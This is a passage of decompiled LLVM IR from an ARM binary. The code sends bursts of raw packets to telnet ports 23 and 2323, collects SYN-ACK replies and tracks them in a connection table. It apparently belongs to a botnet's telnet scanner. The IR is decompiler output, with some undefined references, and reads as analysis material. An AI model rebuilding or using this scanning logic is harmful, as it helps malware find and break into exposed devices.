  store i1 %v9_10910, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_10910, label %bb365, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_108b4
  store i32 ptrtoint (i16* @global_var_21344.201 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_108ec, i16* bitcast (i32* @global_var_2133a.306 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21344.201 to i32), i32 2) to i16*), align 2
  %v4_10930 = load i32, i32* @global_var_21340.307, align 4
  store i32 %v4_10930, i32* @global_var_21348.309, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb366

bb365:                                            ; preds = %dec_label_pc_108b4
  store i16 %v4_108ec, i16* bitcast (i32* @global_var_2133a.306 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %r0.global-to-local, align 4
  %v4_1093034 = load i32, i32* @global_var_21340.307, align 4
  store i32 ptrtoint (i16* @global_var_21344.201 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_1093034, i32* @global_var_21348.309, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21344.201 to i32), i32 2) to i16*), align 2
  br label %bb366

bb366:                                            ; preds = %.thread40, %bb365
  store i16 0, i16* bitcast (i32* @global_var_21354.310 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_21344.201 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_1095c = call i32 @function_dce8(i32 ptrtoint (i8** @global_var_21330.198 to i32), i32 sext (i16 ptrtoint (i16* @global_var_21344.201 to i16) to i32), i32 5120, i32 20)
  %v7_1095c = trunc i32 %v6_1095c to i16
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %r1.global-to-local, align 4
  %v2_10968 = load i32, i32* @global_var_233b4.196, align 4
  store i16 %v7_1095c, i16* bitcast (i32* @global_var_21354.310 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 %v2_10754, i32* %ip.global-to-local, align 4
  store i32 %v2_10968, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_109b0 = call i32 @function_138bc(i32 %v2_10968, i32 ptrtoint (i8** @global_var_21330.198 to i32), i32 40, i32 16384, i32 %v2_1075c, i32 16)
  store i32 %v7_109b0, i32* %r0.global-to-local, align 4
  %v3_109b4 = load i32, i32* %stack_var_-52, align 4
  %v1_109b8 = add i32 %v3_109b4, 1
  store i32 %v1_109b8, i32* %r3.global-to-local, align 4
  %v2_109bc = icmp ugt i32 %v1_109b8, 158
  store i1 %v2_109bc, i1* %cpsr_c.global-to-local, align 1
  %v7_109bc = icmp eq i32 %v1_109b8, 159
  store i1 %v7_109bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_109b8, i32* %stack_var_-52, align 4
  %v7_109c4 = icmp slt i32 %v1_109b8, 160
  br i1 %v7_109c4, label %dec_label_pc_10760, label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %bb366
  %v0_109c8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_1073c, %dec_label_pc_109c8
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_1073c ], [ %v0_109c8, %dec_label_pc_109c8 ]
  %v0_109cc = call i32 @function_13574()
  store i32 %v0_10a48, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_109dc = add i32 %v0_10a48, 20
  store i32 %v1_109dc, i32* @r4, align 4
  %v2_109e8 = inttoptr i32 %v0_109cc to i32*
  %v1_10a38 = add i32 %v0_10a48, 16
  %v2_10a38 = inttoptr i32 %v1_10a38 to i32*
  %v4_10a74 = sext i16 %stack_var_-1884.0 to i32
  %v1_10a48 = add i32 %v0_10a48, 9
  %v2_10a48 = inttoptr i32 %v1_10a48 to i8*
  %v1_10adc = add i32 %v0_10a48, 12
  %v2_10adc = inttoptr i32 %v1_10adc to i32*
  br label %dec_label_pc_109e0

dec_label_pc_109e0:                               ; preds = %dec_label_pc_10aa4, %dec_label_pc_10a9c, %dec_label_pc_10a94, %dec_label_pc_10a70, %dec_label_pc_10a60, %dec_label_pc_10a48, %dec_label_pc_10a30, %dec_label_pc_10a8c, %dec_label_pc_10a80, %dec_label_pc_10a28, %dec_label_pc_10b5c, %dec_label_pc_109cc
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_109e8, align 4
  %v2_109f0 = load i32, i32* @global_var_233b4.196, align 4
  store i32 %v2_109f0, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_10a48, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a04 = load i32, i32* %ip.global-to-local, align 4
  %v6_10a0c = call i32 @function_13848(i32 %v2_109f0, i32 %v0_10a48, i32 1514, i32 16384, i32 %v0_10a04, i32 %v0_10a04)
  store i32 %v6_10a0c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a10 = icmp eq i32 %v6_10a0c, 0
  store i1 %v2_10a10, i1* %cpsr_z.global-to-local, align 1
  %tmp367 = icmp slt i32 %v6_10a0c, 1
  br i1 %tmp367, label %dec_label_pc_10b80, label %dec_label_pc_10a18

dec_label_pc_10a18:                               ; preds = %dec_label_pc_109e0
  store i32 %v0_109cc, i32* %ip.global-to-local, align 4
  %v2_10a1c = load i32, i32* %v2_109e8, align 4
  store i32 %v2_10a1c, i32* %r3.global-to-local, align 4
  %v2_10a20 = icmp ugt i32 %v2_10a1c, 10
  store i1 %v2_10a20, i1* %cpsr_c.global-to-local, align 1
  %v7_10a20 = icmp eq i32 %v2_10a1c, 11
  store i1 %v7_10a20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a20, label %dec_label_pc_10b80, label %dec_label_pc_10a28

dec_label_pc_10a28:                               ; preds = %dec_label_pc_10a18
  %v2_10a28 = icmp ugt i32 %v6_10a0c, 38
  store i1 %v2_10a28, i1* %cpsr_c.global-to-local, align 1
  %v7_10a28 = icmp eq i32 %v6_10a0c, 39
  store i1 %v7_10a28, i1* %cpsr_z.global-to-local, align 1
  %v2_10a2c = xor i1 %v2_10a28, true
  %v3_10a2c = or i1 %v7_10a28, %v2_10a2c
  br i1 %v3_10a2c, label %dec_label_pc_109e0, label %dec_label_pc_10a30

dec_label_pc_10a30:                               ; preds = %dec_label_pc_10a28
  store i32 ptrtoint (i32* @global_var_23394.88 to i32), i32* %r0.global-to-local, align 4
  %v3_10a38 = load i32, i32* %v2_10a38, align 4
  store i32 %v3_10a38, i32* %r2.global-to-local, align 4
  %v2_10a3c = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_10a3c, i32* %r3.global-to-local, align 4
  %v3_10a40 = icmp uge i32 %v3_10a38, %v2_10a3c
  store i1 %v3_10a40, i1* %cpsr_c.global-to-local, align 1
  %v9_10a40 = icmp eq i32 %v3_10a38, %v2_10a3c
  store i1 %v9_10a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10a40, label %dec_label_pc_10a48, label %dec_label_pc_109e0

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a30
  %v3_10a48 = load i8, i8* %v2_10a48, align 1
  %v4_10a48 = zext i8 %v3_10a48 to i32
  store i32 %v4_10a48, i32* %r3.global-to-local, align 4
  %v2_10a4c = icmp ugt i8 %v3_10a48, 5
  store i1 %v2_10a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a4c = icmp eq i8 %v3_10a48, 6
  store i1 %v7_10a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a4c, label %dec_label_pc_10a54, label %dec_label_pc_109e0

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a48
  %v0_10a54 = load i32, i32* @r4, align 4
  %v1_10a54 = inttoptr i32 %v0_10a54 to i16*
  %v2_10a54 = load i16, i16* %v1_10a54, align 2
  %v3_10a54 = zext i16 %v2_10a54 to i32
  store i32 %v3_10a54, i32* %ip.global-to-local, align 4
  %v2_10a58 = icmp ugt i16 %v2_10a54, 5887
  store i1 %v2_10a58, i1* %cpsr_c.global-to-local, align 1
  %v7_10a58 = icmp eq i16 %v2_10a54, 5888
  store i1 %v7_10a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a58, label %dec_label_pc_10a70, label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a54
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_10a68 = icmp ugt i16 %v2_10a54, 4872
  store i1 %v3_10a68, i1* %cpsr_c.global-to-local, align 1
  %v9_10a68 = icmp eq i16 %v2_10a54, 4873
  store i1 %v9_10a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10a68, label %dec_label_pc_10a70, label %dec_label_pc_109e0

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a60, %dec_label_pc_10a54
  %v1_10a70 = add i32 %v0_10a54, 2
  %v2_10a70 = inttoptr i32 %v1_10a70 to i16*
  %v3_10a70 = load i16, i16* %v2_10a70, align 2
  %v4_10a70 = zext i16 %v3_10a70 to i32
  store i32 %v4_10a70, i32* %r3.global-to-local, align 4
  store i32 %v4_10a74, i32* %r1.global-to-local, align 4
  %v3_10a78 = icmp uge i32 %v4_10a70, %v4_10a74
  store i1 %v3_10a78, i1* %cpsr_c.global-to-local, align 1
  %v9_10a78 = icmp eq i32 %v4_10a70, %v4_10a74
  store i1 %v9_10a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10a78, label %dec_label_pc_10a80, label %dec_label_pc_109e0

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a70
  %v1_10a80 = add i32 %v0_10a54, 13
  %v2_10a80 = inttoptr i32 %v1_10a80 to i8*
  %v3_10a80 = load i8, i8* %v2_10a80, align 1
  %v4_10a80 = zext i8 %v3_10a80 to i32
  store i32 %v4_10a80, i32* %r3.global-to-local, align 4
  %v1_10a84 = and i32 %v4_10a80, 2
  %v2_10a84 = icmp eq i32 %v1_10a84, 0
  store i1 %v2_10a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a84, label %dec_label_pc_109e0, label %dec_label_pc_10a8c

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a80
  %v1_10a8c = and i32 %v4_10a80, 16
  %v2_10a8c = icmp eq i32 %v1_10a8c, 0
  store i1 %v2_10a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a8c, label %dec_label_pc_109e0, label %dec_label_pc_10a94

dec_label_pc_10a94:                               ; preds = %dec_label_pc_10a8c
  %v1_10a94 = and i32 %v4_10a80, 4
  %v2_10a94 = icmp eq i32 %v1_10a94, 0
  store i1 %v2_10a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a94, label %dec_label_pc_10a9c, label %dec_label_pc_109e0

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a94
  %tmp515 = urem i8 %v3_10a80, 2
  %v2_10a9c = icmp eq i8 %tmp515, 0
  store i1 %v2_10a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a9c, label %dec_label_pc_10aa4, label %dec_label_pc_109e0

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a9c
  %v1_10aa4 = add i32 %v0_10a54, 8
  %v2_10aa4 = inttoptr i32 %v1_10aa4 to i32*
  %v3_10aa4 = load i32, i32* %v2_10aa4, align 4
  %v5_10abc = call i32 @llvm.bswap.i32(i32 %v3_10aa4)
  %v1_10ac0 = add i32 %v5_10abc, -1
  store i32 %v1_10ac0, i32* %r2.global-to-local, align 4
  %v3_10ac8 = udiv i32 %v1_10ac0, 16777216
  %v1_10ac4 = udiv i32 %v1_10ac0, 256
  %v4_10acc = and i32 %v1_10ac4, 65280
  %v5_10acc = or i32 %v4_10acc, %v3_10ac8
  store i32 %v0_10a48, i32* %r0.global-to-local, align 4
  %v1_10ad4 = and i32 %v1_10ac0, 65280
  store i32 %v1_10ad4, i32* %r1.global-to-local, align 4
  %v4_10ad8 = mul nuw nsw i32 %v1_10ad4, 256
  %v5_10ad8 = or i32 %v5_10acc, %v4_10ad8
  store i32 %v5_10ad8, i32* %r3.global-to-local, align 4
  %v3_10adc = load i32, i32* %v2_10adc, align 4
  store i32 %v3_10adc, i32* @lr, align 4
  %v5_10ae0 = call i32 @llvm.bswap.i32(i32 %v1_10ac0)
  store i32 %v5_10ae0, i32* %r3.global-to-local, align 4
  %v3_10ae4 = icmp uge i32 %v5_10ae0, %v3_10adc
  store i1 %v3_10ae4, i1* %cpsr_c.global-to-local, align 1
  %v9_10ae4 = icmp eq i32 %v5_10ae0, %v3_10adc
  store i1 %v9_10ae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10ae4, label %dec_label_pc_10aec, label %dec_label_pc_109e0

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10aa4
  %v0_10aec = load i32, i32* @r5, align 4
  %v2_10aec = icmp ugt i32 %v0_10aec, 126
  store i1 %v2_10aec, i1* %cpsr_c.global-to-local, align 1
  %v7_10aec = icmp eq i32 %v0_10aec, 127
  store i1 %v7_10aec, i1* %cpsr_z.global-to-local, align 1
  %v8_10af0 = icmp sgt i32 %v0_10aec, 127
  br i1 %v8_10af0, label %dec_label_pc_10b80, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10aec
  %v2_10afc = load i32, i32* @global_var_233b0.194, align 4
  store i32 %v2_10afc, i32* %r1.global-to-local, align 4
  %v3_10b00 = mul i32 %v0_10aec, 256
  store i32 %v3_10b00, i32* %r2.global-to-local, align 4
  %v2_10b04 = mul i32 %v0_10aec, 288
  store i32 %v2_10b04, i32* %r3.global-to-local, align 4
  %v2_10b08 = add i32 %v2_10afc, %v2_10b04
  store i32 %v2_10b08, i32* @r0, align 4
  %v1_10b0c = add i32 %v2_10b08, 12
  %v2_10b0c = inttoptr i32 %v1_10b0c to i32*
  %v3_10b0c = load i32, i32* %v2_10b0c, align 4
  store i32 %v3_10b0c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b10 = icmp eq i32 %v3_10b0c, 0
  store i1 %v2_10b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b10, label %dec_label_pc_10b54, label %dec_label_pc_10b30.preheader

dec_label_pc_10b30.preheader:                     ; preds = %dec_label_pc_10af4
  %v2_10b14 = add i32 %v0_10aec, 1
  %v2_10b1c = and i32 %v2_10b14, 134217728
  %v3_10b1c = icmp ne i32 %v2_10b1c, 0
  store i1 %v3_10b1c, i1* %cpsr_c.global-to-local, align 1
  %v3_10b20 = mul i32 %v2_10b14, 288
  %v3_10b24 = add i32 %v2_10afc, %v3_10b20
  store i32 %v3_10b24, i32* %r3.global-to-local, align 4
  store i32 %v0_10aec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b30

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b30.preheader, %dec_label_pc_10b3c
  %v0_10b3c = phi i32 [ %v3_10b24, %dec_label_pc_10b30.preheader ], [ %v1_10b48, %dec_label_pc_10b3c ]
  %v0_10b30 = phi i32 [ %v0_10aec, %dec_label_pc_10b30.preheader ], [ %v1_10b30, %dec_label_pc_10b3c ]
  %v1_10b30 = add i32 %v0_10b30, 1
  store i32 %v1_10b30, i32* %r2.global-to-local, align 4
  %v7_10b34 = icmp eq i32 %v1_10b30, 128
  br i1 %v7_10b34, label %dec_label_pc_10b80.loopexit, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b30
  store i32 %v0_10b3c, i32* @r0, align 4
  %v1_10b40 = add i32 %v0_10b3c, 12
  %v2_10b40 = inttoptr i32 %v1_10b40 to i32*
  %v3_10b40 = load i32, i32* %v2_10b40, align 4
  %v2_10b44 = icmp eq i32 %v3_10b40, 0
  %v1_10b48 = add i32 %v0_10b3c, 288
  store i32 %v1_10b48, i32* %r3.global-to-local, align 4
  br i1 %v2_10b44, label %dec_label_pc_10b50, label %dec_label_pc_10b30

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b3c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10b30, i32* @r5, align 4
  br label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10af4, %dec_label_pc_10b50
  %v1_10b5c = phi i32 [ %v2_10b08, %dec_label_pc_10af4 ], [ %v0_10b3c, %dec_label_pc_10b50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b54 = icmp eq i32 %v1_10b5c, 0
  store i1 %v2_10b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b54, label %dec_label_pc_10b80, label %dec_label_pc_10b5c

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10b54
  %v2_10b5c = add i32 %v1_10b5c, 16
  %v3_10b5c = inttoptr i32 %v2_10b5c to i32*
  store i32 %v3_10adc, i32* %v3_10b5c, align 4
  %v0_10b60 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b60 = trunc i32 %v0_10b60 to i16
  %v2_10b60 = load i32, i32* @r0, align 4
  %v3_10b60 = add i32 %v2_10b60, 20
  %v4_10b60 = inttoptr i32 %v3_10b60 to i16*
  store i16 %v1_10b60, i16* %v4_10b60, align 2
  %v0_10b64 = call i32 @function_ff34()
  store i32 %v0_10b64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109e0

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10250
  store i32 ptrtoint (i32* @global_var_233b4.196 to i32), i32* %ip.global-to-local, align 4
  %v2_10b70 = load i32, i32* @global_var_233b4.196, align 4
  store i32 %v2_10b70, i32* %r0.global-to-local, align 4
  %v1_10b74 = call i32 @function_1314c(i32 %v2_10b70)
  store i32 %v1_10b74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b78

dec_label_pc_10b78:                               ; preds = %dec_label_pc_1022c, %dec_label_pc_10b6c
  %v0_10b78 = load i32, i32* @r5, align 4
  store i32 %v0_10b78, i32* %r0.global-to-local, align 4
  %v1_10b7c = call i32 @function_15194(i32 %v0_10b78)
  store i32 %v1_10b7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b80

dec_label_pc_10b80.loopexit:                      ; preds = %dec_label_pc_10b30
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b54, %dec_label_pc_10aec, %dec_label_pc_10a18, %dec_label_pc_109e0, %dec_label_pc_10b80.loopexit, %dec_label_pc_10b78
  %stack_var_-1876.0 = phi i32 [ %tmp296, %dec_label_pc_10b78 ], [ %v0_109cc, %dec_label_pc_10b80.loopexit ], [ %v0_109cc, %dec_label_pc_109e0 ], [ %v0_109cc, %dec_label_pc_10a18 ], [ %v0_109cc, %dec_label_pc_10aec ], [ %v0_109cc, %dec_label_pc_10b54 ]
  %stack_var_-1880.2 = phi i32 [ %tmp300, %dec_label_pc_10b78 ], [ %stack_var_-1880.1, %dec_label_pc_10b80.loopexit ], [ %stack_var_-1880.1, %dec_label_pc_109e0 ], [ %stack_var_-1880.1, %dec_label_pc_10a18 ], [ %stack_var_-1880.1, %dec_label_pc_10aec ], [ %stack_var_-1880.1, %dec_label_pc_10b54 ]
  %stack_var_-1888.1 = phi i32 [ %tmp301, %dec_label_pc_10b78 ], [ %v0_10a48, %dec_label_pc_10b80.loopexit ], [ %v0_10a48, %dec_label_pc_109e0 ], [ %v0_10a48, %dec_label_pc_10a18 ], [ %v0_10a48, %dec_label_pc_10aec ], [ %v0_10a48, %dec_label_pc_10b54 ]
  %stack_var_-1884.1 = phi i16 [ %tmp302, %dec_label_pc_10b78 ], [ %stack_var_-1884.0, %dec_label_pc_10b80.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_109e0 ], [ %stack_var_-1884.0, %dec_label_pc_10a18 ], [ %stack_var_-1884.0, %dec_label_pc_10aec ], [ %stack_var_-1884.0, %dec_label_pc_10b54 ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_10ba0473 = load i32, i32* @sp, align 4
  %v3_10ba0474 = add i32 %v2_10ba0473, 1676
  %v4_10ba0475 = inttoptr i32 %v3_10ba0474 to i32*
  store i32 0, i32* %v4_10ba0475, align 4
  br label %dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge

dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge:  ; preds = %dec_label_pc_10b80, %dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge
  %v0_10b8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10b90 = add i32 %v0_10b8c.pre, 4
  store i32 %v1_10b90, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10b98 = add i32 %v0_10b8c.pre, 1672
  store i32 %v1_10b98, i32* %ip.global-to-local, align 4
  %v7_10b9c = icmp eq i32 %v1_10b90, 128
  %v2_10ba0 = load i32, i32* @sp, align 4
  %v3_10ba0 = add i32 %v2_10ba0, %v1_10b98
  %v4_10ba0 = inttoptr i32 %v3_10ba0 to i32*
  store i32 0, i32* %v4_10ba0, align 4
  br i1 %v7_10b9c, label %dec_label_pc_10ba8, label %dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10ba8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10ba8, i32* %stack_var_-352, align 4
  %v1_10bb4467 = add i32 %v0_10ba8, 8
  store i32 %v1_10bb4467, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10bbc468 = add i32 %v0_10ba8, 1548
  store i32 %v1_10bbc468, i32* @lr, align 4
  %v7_10bc0469 = icmp eq i32 %v1_10bb4467, 128
  %v2_10bc4470 = load i32, i32* @sp, align 4
  %v3_10bc4471 = add i32 %v2_10bc4470, %v1_10bbc468
  %v4_10bc4472 = inttoptr i32 %v3_10bc4471 to i32*
  store i32 0, i32* %v4_10bc4472, align 4
  br i1 %v7_10bc0469, label %dec_label_pc_10bcc, label %dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge

dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge:  ; preds = %dec_label_pc_10ba8, %dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge
  %v0_10bb0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10bb4 = add i32 %v0_10bb0.pre, 4
  store i32 %v1_10bb4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10bbc = add i32 %v0_10bb0.pre, 1544
  store i32 %v1_10bbc, i32* @lr, align 4
  %v7_10bc0 = icmp eq i32 %v1_10bb4, 128
  %v2_10bc4 = load i32, i32* @sp, align 4
  %v3_10bc4 = add i32 %v2_10bc4, %v1_10bbc
  %v4_10bc4 = inttoptr i32 %v3_10bc4 to i32*
  store i32 0, i32* %v4_10bc4, align 4
  br i1 %v7_10bc0, label %dec_label_pc_10bcc, label %dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge, %dec_label_pc_10ba8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10bcc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10bcc, i32* @r6, align 4
  store i32 %v0_10bcc, i32* @r5, align 4
  store i32 %v0_10bcc, i32* %stack_var_-52, align 4
  %v2_11af0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10c28

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10c58
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10c44, i1* %cpsr_z.global-to-local, align 1
  %v1_11ae4 = add i32 %v2_10c3c, 4
  %v2_11ae4 = inttoptr i32 %v1_11ae4 to i32*
  %v3_11ae4 = load i32, i32* %v2_11ae4, align 4
  br i1 %v7_10c44, label %dec_label_pc_11ae4, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bdc
  store i32 %v3_11ae4, i32* %ip.global-to-local, align 4
  %v3_10be8 = udiv i32 %v3_11ae4, 32
  store i32 %v2_11af0, i32* %r0.global-to-local, align 4
  %v3_10bf0 = mul nuw nsw i32 %v3_10be8, 4
  %v2_10bf4 = add i32 %v3_10bf0, %v2_11af0
  store i32 %v2_10bf4, i32* %r3.global-to-local, align 4
  %v1_10bf8 = add i32 %v2_10bf4, -184
  %v2_10bf8 = inttoptr i32 %v1_10bf8 to i32*
  %v3_10bf8 = load i32, i32* %v2_10bf8, align 4
  %v1_10bfc = urem i32 %v3_11ae4, 32
  store i32 %v1_10bfc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10c04 = shl i32 1, %v1_10bfc
  %v8_10c04 = or i32 %v3_10bf8, %v7_10c04
  store i32 %v8_10c04, i32* %r2.global-to-local, align 4
  store i32 %v8_10c04, i32* %v2_10bf8, align 4
  %v0_10c0c = load i32, i32* @r6, align 4
  %v1_10c0c = load i32, i32* %ip.global-to-local, align 4
  %v3_10c0c = icmp uge i32 %v0_10c0c, %v1_10c0c
  store i1 %v3_10c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_10c0c = icmp eq i32 %v0_10c0c, %v1_10c0c
  store i1 %v9_10c0c, i1* %cpsr_z.global-to-local, align 1
  %v5_10c10 = icmp slt i32 %v0_10c0c, %v1_10c0c
  br i1 %v5_10c10, label %bb368, label %bb369

bb368:                                            ; preds = %dec_label_pc_10be4
  store i32 %v1_10c0c, i32* @r6, align 4
  br label %bb369

bb369:                                            ; preds = %.thread55, %bb375, %bb373, %dec_label_pc_10cbc, %bb418, %dec_label_pc_10be4, %bb368
  %v3_10c14 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10c14, i32* %r3.global-to-local, align 4
  %v1_10c18 = add i32 %v3_10c14, 1
  store i32 %v1_10c18, i32* %r2.global-to-local, align 4
  %v2_10c1c = icmp ugt i32 %v1_10c18, 126
  store i1 %v2_10c1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c1c = icmp eq i32 %v1_10c18, 127
  store i1 %v7_10c1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10c18, i32* %stack_var_-52, align 4
  %v8_10c24 = icmp sgt i32 %v1_10c18, 127
  br i1 %v8_10c24, label %dec_label_pc_10cc8, label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %bb369, %dec_label_pc_10bcc
  %v0_10c34 = phi i32 [ %v1_10c18, %bb369 ], [ %v0_10bcc, %dec_label_pc_10bcc ]
  store i32 ptrtoint (i32* @global_var_233b0.194 to i32), i32* %r0.global-to-local, align 4
  %v3_10c2c = mul i32 %v0_10c34, 256
  store i32 %v3_10c2c, i32* %r3.global-to-local, align 4
  %v2_10c30 = load i32, i32* @global_var_233b0.194, align 4
  store i32 %v2_10c30, i32* %r1.global-to-local, align 4
  %v2_10c38 = mul i32 %v0_10c34, 288
  store i32 %v2_10c38, i32* %r2.global-to-local, align 4
  %v2_10c3c = add i32 %v2_10c30, %v2_10c38
  store i32 %v2_10c3c, i32* @r4, align 4
  %v1_10c40 = add i32 %v2_10c3c, 12
  %v2_10c40 = inttoptr i32 %v1_10c40 to i32*
  %v3_10c40 = load i32, i32* %v2_10c40, align 4
  store i32 %v3_10c40, i32* %ip.global-to-local, align 4
  %v2_10c44 = icmp ne i32 %v3_10c40, 0
  store i1 %v2_10c44, i1* %cpsr_c.global-to-local, align 1
  %v7_10c44 = icmp eq i32 %v3_10c40, 1
  store i1 %v7_10c44, i1* %cpsr_z.global-to-local, align 1
  %v2_10c48 = xor i1 %v2_10c44, true
  %v3_10c48 = or i1 %v7_10c44, %v2_10c48
  br i1 %v3_10c48, label %bb370, label %bb371

bb370:                                            ; preds = %dec_label_pc_10c28
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb371

bb371:                                            ; preds = %dec_label_pc_10c28, %bb370
  %v1_10c68165 = phi i32 [ %v2_10c30, %dec_label_pc_10c28 ], [ 5, %bb370 ]
  %v2_10c4c = xor i1 %v7_10c44, true
  %v3_10c4c = and i1 %v2_10c44, %v2_10c4c
  br i1 %v3_10c4c, label %bb372, label %bb373

bb372:                                            ; preds = %bb371
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb373

bb373:                                            ; preds = %bb371, %bb372
  %v1_10c68 = phi i32 [ %v1_10c68165, %bb371 ], [ 30, %bb372 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c50 = icmp eq i32 %v3_10c40, 0
